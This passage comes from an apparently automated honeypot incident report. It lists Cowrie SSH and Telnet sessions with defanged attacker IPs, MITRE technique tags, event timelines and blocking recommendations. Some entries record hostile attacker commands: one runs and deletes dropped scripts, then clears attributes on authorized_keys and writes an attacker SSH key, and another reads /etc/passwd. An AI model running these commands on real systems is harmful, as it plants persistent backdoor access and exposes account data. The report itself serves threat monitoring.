| `2026-08-11 02:49:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `130.211.76[.]1` to AbuseIPDB if not already reported
- [ ] Block `130.211.76[.]1` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e86e51c88875

| Field | Detail |
|---|---|
| **Source IP** | `130.211.76[.]1` |
| **First Seen** | 2026-08-11 02:49 |
| **Last Seen** | 2026-08-11 02:49 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 02:49:40` | `cowrie.session.connect` |
| `2026-08-11 02:49:40` | `cowrie.login.success` |
| `2026-08-11 02:49:40` | `cowrie.session.params` |
| `2026-08-11 02:49:40` | `cowrie.command.input` |
| `2026-08-11 02:49:42` | `cowrie.log.closed` |
| `2026-08-11 02:49:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `130.211.76[.]1` to AbuseIPDB if not already reported
- [ ] Block `130.211.76[.]1` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-31b0daf7854e

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-08-11 02:50 |
| **Last Seen** | 2026-08-11 02:50 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 02:50:45` | `cowrie.session.connect` |
| `2026-08-11 02:50:45` | `cowrie.client.version` |
| `2026-08-11 02:50:45` | `cowrie.client.kex` |
| `2026-08-11 02:50:45` | `cowrie.login.success` |
| `2026-08-11 02:50:46` | `cowrie.direct-tcpip.request` |
| `2026-08-11 02:50:46` | `cowrie.direct-tcpip.data` |
| `2026-08-11 02:50:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-859add1d2217

| Field | Detail |
|---|---|
| **Source IP** | `14.54.22[.]11` |
| **First Seen** | 2026-08-11 02:51 |
| **Last Seen** | 2026-08-11 02:51 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 02:51:08` | `cowrie.session.connect` |
| `2026-08-11 02:51:08` | `cowrie.client.version` |
| `2026-08-11 02:51:08` | `cowrie.client.kex` |
| `2026-08-11 02:51:11` | `cowrie.login.success` |
| `2026-08-11 02:51:12` | `cowrie.direct-tcpip.request` |
| `2026-08-11 02:51:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.54.22[.]11` to AbuseIPDB if not already reported
- [ ] Block `14.54.22[.]11` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5afc103b7e0b

| Field | Detail |
|---|---|
| **Source IP** | `124.160.45[.]26` |
| **First Seen** | 2026-08-11 02:53 |
| **Last Seen** | 2026-08-11 02:53 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 02:53:47` | `cowrie.session.connect` |
| `2026-08-11 02:53:49` | `cowrie.client.version` |
| `2026-08-11 02:53:49` | `cowrie.client.kex` |
| `2026-08-11 02:53:52` | `cowrie.login.success` |
| `2026-08-11 02:53:54` | `cowrie.direct-tcpip.request` |
| `2026-08-11 02:53:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `124.160.45[.]26` to AbuseIPDB if not already reported
- [ ] Block `124.160.45[.]26` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-749ba382372a

| Field | Detail |
|---|---|
| **Source IP** | `34.77.50[.]133` |
| **First Seen** | 2026-08-11 03:03 |
| **Last Seen** | 2026-08-11 03:03 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0[.]0 Safari/537.36, Accept-Encoding: gzip` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 03:03:15` | `cowrie.session.connect` |
| `2026-08-11 03:03:15` | `cowrie.login.success` |
| `2026-08-11 03:03:16` | `cowrie.session.params` |
| `2026-08-11 03:03:16` | `cowrie.command.input` |
| `2026-08-11 03:03:16` | `cowrie.command.input` |
| `2026-08-11 03:03:16` | `cowrie.command.failed` |
| `2026-08-11 03:03:16` | `cowrie.command.input` |
| `2026-08-11 03:03:16` | `cowrie.log.closed` |
| `2026-08-11 03:03:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.77.50[.]133` to AbuseIPDB if not already reported
- [ ] Block `34.77.50[.]133` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f9fca6a1e558

| Field | Detail |
|---|---|
| **Source IP** | `34.77.50[.]133` |
| **First Seen** | 2026-08-11 03:03 |
| **Last Seen** | 2026-08-11 03:03 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `PING` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 03:03:28` | `cowrie.session.connect` |
| `2026-08-11 03:03:28` | `cowrie.login.success` |
| `2026-08-11 03:03:29` | `cowrie.session.params` |
| `2026-08-11 03:03:29` | `cowrie.command.input` |
| `2026-08-11 03:03:29` | `cowrie.command.failed` |
| `2026-08-11 03:03:36` | `cowrie.log.closed` |
| `2026-08-11 03:03:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.77.50[.]133` to AbuseIPDB if not already reported
- [ ] Block `34.77.50[.]133` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-639bf8a3a3d0

| Field | Detail |
|---|---|
| **Source IP** | `34.77.50[.]133` |
| **First Seen** | 2026-08-11 03:03 |
| **Last Seen** | 2026-08-11 03:03 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 03:03:30` | `cowrie.session.connect` |
| `2026-08-11 03:03:30` | `cowrie.login.success` |
| `2026-08-11 03:03:31` | `cowrie.session.params` |
| `2026-08-11 03:03:31` | `cowrie.command.input` |
| `2026-08-11 03:03:36` | `cowrie.log.closed` |
| `2026-08-11 03:03:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.77.50[.]133` to AbuseIPDB if not already reported
- [ ] Block `34.77.50[.]133` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-416610447e2d

| Field | Detail |
|---|---|
| **Source IP** | `147.139.136[.]75` |
| **First Seen** | 2026-08-11 03:09 |
| **Last Seen** | 2026-08-11 03:09 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 03:09:47` | `cowrie.session.connect` |
| `2026-08-11 03:09:47` | `cowrie.client.version` |
| `2026-08-11 03:09:47` | `cowrie.client.kex` |
| `2026-08-11 03:09:48` | `cowrie.login.success` |
| `2026-08-11 03:09:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `147.139.136[.]75` to AbuseIPDB if not already reported
- [ ] Block `147.139.136[.]75` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3c886859009b

| Field | Detail |
|---|---|
| **Source IP** | `130.12.180[.]51` |
| **First Seen** | 2026-08-11 03:09 |
| **Last Seen** | 2026-08-11 03:09 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `chmod +x clean.sh; sh clean.sh; rm -rf clean.sh; chmod +x setup.sh; sh setup.sh; rm -rf setup.sh; mkdir -p ~/.ssh; chattr -ia ~/.ssh/authorized_keys; echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCqHrvnL6l7rT/mt1AdgdY9tC1GPK216q0q/7neNVqm7AgvfJIM3ZKniGC3S5x6KOEApk+83GM4IKjCPfq007SvT07qh9AscVxegv66I5yuZTEaDAG6cPXxg3/0oXHTOTvxelgbRrMzfU5SEDAEi8+ByKMefE+pDVALgSTBYhol96hu1GthAMtPAFahqxrvaRR4nL4ijxOsmSLREoAb1lxiX7yvoYLT45/1c5dJdrJrQ60uKyieQ6FieWpO2xF6tzfdmHbiVdSmdw0BiCRwe+fuknZYQxIC1owAj2p5bc+nzVTi3mtBEk9rGpgBnJ1h` |
| **TTPs (MITRE)** | T1021.004 · T1059.004 · T1078 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 03:09:49` | `cowrie.session.connect` |
| `2026-08-11 03:09:49` | `cowrie.client.version` |
| `2026-08-11 03:09:49` | `cowrie.client.kex` |
| `2026-08-11 03:09:49` | `cowrie.login.success` |
| `2026-08-11 03:09:51` | `cowrie.session.params` |
| `2026-08-11 03:09:51` | `cowrie.command.input` |
| `2026-08-11 03:09:51` | `cowrie.log.closed` |
| `2026-08-11 03:09:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `130.12.180[.]51` to AbuseIPDB if not already reported
- [ ] Block `130.12.180[.]51` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9e5c2e80f1e0

| Field | Detail |
|---|---|
| **Source IP** | `178.178.194[.]131` |
| **First Seen** | 2026-08-11 03:09 |
| **Last Seen** | 2026-08-11 03:10 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 03:09:59` | `cowrie.session.connect` |
| `2026-08-11 03:09:59` | `cowrie.client.version` |
| `2026-08-11 03:09:59` | `cowrie.client.kex` |
| `2026-08-11 03:10:00` | `cowrie.login.success` |
| `2026-08-11 03:10:00` | `cowrie.direct-tcpip.request` |
| `2026-08-11 03:10:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `178.178.194[.]131` to AbuseIPDB if not already reported
- [ ] Block `178.178.194[.]131` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-12724533970c

| Field | Detail |
|---|---|
| **Source IP** | `210.0.90[.]82` |
| **First Seen** | 2026-08-11 03:10 |
| **Last Seen** | 2026-08-11 03:10 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 03:10:06` | `cowrie.session.connect` |
| `2026-08-11 03:10:06` | `cowrie.client.version` |
| `2026-08-11 03:10:06` | `cowrie.client.kex` |
| `2026-08-11 03:10:09` | `cowrie.login.success` |
| `2026-08-11 03:10:10` | `cowrie.direct-tcpip.request` |
| `2026-08-11 03:10:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `210.0.90[.]82` to AbuseIPDB if not already reported
- [ ] Block `210.0.90[.]82` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1e50e264739f

| Field | Detail |
|---|---|
| **Source IP** | `122.170.111[.]140` |
| **First Seen** | 2026-08-11 03:14 |
| **Last Seen** | 2026-08-11 03:14 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 03:14:46` | `cowrie.session.connect` |
| `2026-08-11 03:14:46` | `cowrie.client.version` |
| `2026-08-11 03:14:46` | `cowrie.client.kex` |
| `2026-08-11 03:14:48` | `cowrie.login.success` |
| `2026-08-11 03:14:48` | `cowrie.direct-tcpip.request` |
| `2026-08-11 03:14:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `122.170.111[.]140` to AbuseIPDB if not already reported
- [ ] Block `122.170.111[.]140` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ad8803133be0

| Field | Detail |
|---|---|
| **Source IP** | `220.134.25[.]203` |
| **First Seen** | 2026-08-11 03:15 |
| **Last Seen** | 2026-08-11 03:15 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 03:15:03` | `cowrie.session.connect` |
| `2026-08-11 03:15:04` | `cowrie.client.version` |
| `2026-08-11 03:15:04` | `cowrie.client.kex` |
| `2026-08-11 03:15:06` | `cowrie.login.success` |
| `2026-08-11 03:15:06` | `cowrie.direct-tcpip.request` |
| `2026-08-11 03:15:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `220.134.25[.]203` to AbuseIPDB if not already reported
- [ ] Block `220.134.25[.]203` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f04b62fa1f32

| Field | Detail |
|---|---|
| **Source IP** | `140.245.50[.]204` |
| **First Seen** | 2026-08-11 03:24 |
| **Last Seen** | 2026-08-11 03:24 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 03:24:10` | `cowrie.session.connect` |
| `2026-08-11 03:24:10` | `cowrie.client.version` |
| `2026-08-11 03:24:10` | `cowrie.client.kex` |
| `2026-08-11 03:24:11` | `cowrie.login.success` |
| `2026-08-11 03:24:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `140.245.50[.]204` to AbuseIPDB if not already reported
- [ ] Block `140.245.50[.]204` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-45430d281ea9

| Field | Detail |
|---|---|
| **Source IP** | `140.245.50[.]204` |
| **First Seen** | 2026-08-11 03:24 |
| **Last Seen** | 2026-08-11 03:24 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 03:24:10` | `cowrie.session.connect` |
| `2026-08-11 03:24:10` | `cowrie.client.version` |
| `2026-08-11 03:24:10` | `cowrie.client.kex` |
| `2026-08-11 03:24:11` | `cowrie.login.success` |
| `2026-08-11 03:24:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `140.245.50[.]204` to AbuseIPDB if not already reported
- [ ] Block `140.245.50[.]204` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-60fdec942788

| Field | Detail |
|---|---|
| **Source IP** | `140.245.50[.]204` |
| **First Seen** | 2026-08-11 03:24 |
| **Last Seen** | 2026-08-11 03:24 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 03:24:15` | `cowrie.session.connect` |
| `2026-08-11 03:24:15` | `cowrie.client.version` |
| `2026-08-11 03:24:15` | `cowrie.client.kex` |
| `2026-08-11 03:24:16` | `cowrie.login.success` |
| `2026-08-11 03:24:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `140.245.50[.]204` to AbuseIPDB if not already reported
- [ ] Block `140.245.50[.]204` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-190832421bfd

| Field | Detail |
|---|---|
| **Source IP** | `140.245.50[.]204` |
| **First Seen** | 2026-08-11 03:24 |
| **Last Seen** | 2026-08-11 03:24 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 03:24:17` | `cowrie.session.connect` |
| `2026-08-11 03:24:17` | `cowrie.client.version` |
| `2026-08-11 03:24:17` | `cowrie.client.kex` |
| `2026-08-11 03:24:18` | `cowrie.login.success` |
| `2026-08-11 03:24:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `140.245.50[.]204` to AbuseIPDB if not already reported
- [ ] Block `140.245.50[.]204` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-99b5058dbd6b

| Field | Detail |
|---|---|
| **Source IP** | `45.178.227[.]0` |
| **First Seen** | 2026-08-11 03:25 |
| **Last Seen** | 2026-08-11 03:25 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 03:25:24` | `cowrie.session.connect` |
| `2026-08-11 03:25:24` | `cowrie.client.version` |
| `2026-08-11 03:25:24` | `cowrie.client.kex` |
| `2026-08-11 03:25:25` | `cowrie.login.success` |
| `2026-08-11 03:25:26` | `cowrie.direct-tcpip.request` |
| `2026-08-11 03:25:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.178.227[.]0` to AbuseIPDB if not already reported
- [ ] Block `45.178.227[.]0` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b210847d8cb1

| Field | Detail |
|---|---|
| **Source IP** | `39.107.142[.]38` |
| **First Seen** | 2026-08-11 03:25 |
| **Last Seen** | 2026-08-11 03:25 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `id, cat /etc/passwd, echo -e "\x61\x75\x74\x68\x5F\x6F\x6B\x0A", enable, system` |
| **TTPs (MITRE)** | T1003.008 · T1059.004 · T1078 · T1083 · T1105 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 03:25:56` | `cowrie.session.connect` |
| `2026-08-11 03:25:57` | `cowrie.telnet.option` |
| `2026-08-11 03:25:57` | `cowrie.telnet.option` |
| `2026-08-11 03:25:57` | `cowrie.login.success` |
| `2026-08-11 03:25:58` | `cowrie.session.params` |
| `2026-08-11 03:25:58` | `cowrie.telnet.option` |
| `2026-08-11 03:25:58` | `cowrie.telnet.option` |
| `2026-08-11 03:25:58` | `cowrie.command.input` |
| `2026-08-11 03:25:58` | `cowrie.command.input` |
| `2026-08-11 03:25:58` | `cowrie.command.input` |
| `2026-08-11 03:25:58` | `cowrie.command.input` |
| `2026-08-11 03:25:58` | `cowrie.command.failed` |
| `2026-08-11 03:25:58` | `cowrie.command.input` |
| `2026-08-11 03:25:58` | `cowrie.command.failed` |
| `2026-08-11 03:25:58` | `cowrie.command.input` |
| `2026-08-11 03:25:58` | `cowrie.command.failed` |
| `2026-08-11 03:25:58` | `cowrie.command.input` |
| `2026-08-11 03:25:58` | `cowrie.command.input` |
| `2026-08-11 03:25:58` | `cowrie.command.input` |
| `2026-08-11 03:25:58` | `cowrie.command.input` |
| `2026-08-11 03:25:58` | `cowrie.command.input` |
| `2026-08-11 03:25:58` | `cowrie.command.input` |
| `2026-08-11 03:25:59` | `cowrie.log.closed` |
| `2026-08-11 03:25:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `39.107.142[.]38` to AbuseIPDB if not already reported
- [ ] Block `39.107.142[.]38` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e43f370b2dc7

| Field | Detail |
|---|---|
| **Source IP** | `220.189.209[.]18` |
| **First Seen** | 2026-08-11 03:28 |
| **Last Seen** | 2026-08-11 03:28 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 03:28:06` | `cowrie.session.connect` |
| `2026-08-11 03:28:06` | `cowrie.client.version` |
| `2026-08-11 03:28:06` | `cowrie.client.kex` |
| `2026-08-11 03:28:09` | `cowrie.login.success` |
| `2026-08-11 03:28:09` | `cowrie.direct-tcpip.request` |
| `2026-08-11 03:28:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `220.189.209[.]18` to AbuseIPDB if not already reported
- [ ] Block `220.189.209[.]18` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7276c5afeb87

| Field | Detail |
|---|---|
| **Source IP** | `85.19.195[.]12` |
| **First Seen** | 2026-08-11 03:28 |
| **Last Seen** | 2026-08-11 03:28 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 03:28:14` | `cowrie.session.connect` |
| `2026-08-11 03:28:14` | `cowrie.client.version` |
| `2026-08-11 03:28:14` | `cowrie.client.kex` |
| `2026-08-11 03:28:15` | `cowrie.login.success` |
| `2026-08-11 03:28:16` | `cowrie.direct-tcpip.request` |
| `2026-08-11 03:28:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `85.19.195[.]12` to AbuseIPDB if not already reported
- [ ] Block `85.19.195[.]12` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-65ff6a28aa51

| Field | Detail |
|---|---|
| **Source IP** | `34.76.72[.]104` |
| **First Seen** | 2026-08-11 03:39 |
| **Last Seen** | 2026-08-11 03:39 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0[.]0 Safari/537.36, Accept-Encoding: gzip` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 03:39:17` | `cowrie.session.connect` |
| `2026-08-11 03:39:17` | `cowrie.login.success` |
| `2026-08-11 03:39:17` | `cowrie.session.params` |
| `2026-08-11 03:39:17` | `cowrie.command.input` |
| `2026-08-11 03:39:17` | `cowrie.command.input` |
| `2026-08-11 03:39:17` | `cowrie.command.failed` |
| `2026-08-11 03:39:17` | `cowrie.command.input` |
| `2026-08-11 03:39:17` | `cowrie.log.closed` |
| `2026-08-11 03:39:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.76.72[.]104` to AbuseIPDB if not already reported
- [ ] Block `34.76.72[.]104` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-09f48df2e5dd

| Field | Detail |
|---|---|
| **Source IP** | `34.76.72[.]104` |
| **First Seen** | 2026-08-11 03:39 |
| **Last Seen** | 2026-08-11 03:39 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `PING` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 03:39:30` | `cowrie.session.connect` |
| `2026-08-11 03:39:30` | `cowrie.login.success` |
| `2026-08-11 03:39:31` | `cowrie.session.params` |
| `2026-08-11 03:39:31` | `cowrie.command.input` |
| `2026-08-11 03:39:31` | `cowrie.command.failed` |
| `2026-08-11 03:39:38` | `cowrie.log.closed` |
| `2026-08-11 03:39:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.76.72[.]104` to AbuseIPDB if not already reported
- [ ] Block `34.76.72[.]104` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bd68ecc8c8aa

| Field | Detail |
|---|---|
| **Source IP** | `34.76.72[.]104` |
| **First Seen** | 2026-08-11 03:39 |
| **Last Seen** | 2026-08-11 03:39 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 03:39:32` | `cowrie.session.connect` |
| `2026-08-11 03:39:32` | `cowrie.login.success` |
| `2026-08-11 03:39:33` | `cowrie.session.params` |
| `2026-08-11 03:39:33` | `cowrie.command.input` |
| `2026-08-11 03:39:38` | `cowrie.log.closed` |
| `2026-08-11 03:39:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.76.72[.]104` to AbuseIPDB if not already reported
- [ ] Block `34.76.72[.]104` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d395e643bf36

| Field | Detail |
|---|---|
| **Source IP** | `59.8.2[.]70` |
| **First Seen** | 2026-08-11 03:44 |
| **Last Seen** | 2026-08-11 03:44 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 03:44:19` | `cowrie.session.connect` |
| `2026-08-11 03:44:20` | `cowrie.client.version` |
| `2026-08-11 03:44:20` | `cowrie.client.kex` |
| `2026-08-11 03:44:22` | `cowrie.login.success` |
| `2026-08-11 03:44:23` | `cowrie.direct-tcpip.request` |
| `2026-08-11 03:44:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `59.8.2[.]70` to AbuseIPDB if not already reported
- [ ] Block `59.8.2[.]70` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9808dc4cceb6

| Field | Detail |
|---|---|
| **Source IP** | `220.178.246[.]43` |
